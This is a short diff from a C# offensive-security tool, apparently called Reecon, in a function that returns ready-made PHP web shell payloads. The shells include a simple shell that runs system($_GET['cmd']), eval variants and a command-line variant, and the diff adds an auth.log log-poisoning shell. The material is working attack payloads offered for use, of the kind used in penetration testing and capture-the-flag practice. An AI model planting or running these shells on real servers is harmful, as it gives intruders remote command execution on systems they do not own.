@@ -200,7 +200,8 @@ namespace Reecon
             return $"Regular: <?php {plainShell} ?>" + Environment.NewLine
                 + $"Safer: <?php {evalShell} ?>" + Environment.NewLine
                 + $"No Upload: php -r \"{evalShell}\"" + Environment.NewLine
-                + "Simple Shell: <?php system($_GET[\"cmd\"]); ?>";
+                + "Simple Shell: <?php system($_GET[\"cmd\"]); ?>" + Environment.NewLine
+                + "/var/log/auth.log Log Poisoning Shell: \"<?php system(\\$_GET['cmd']); ?>\"@ipaddress";
         }
 
         private static string PowershellShell(string ip, string port)
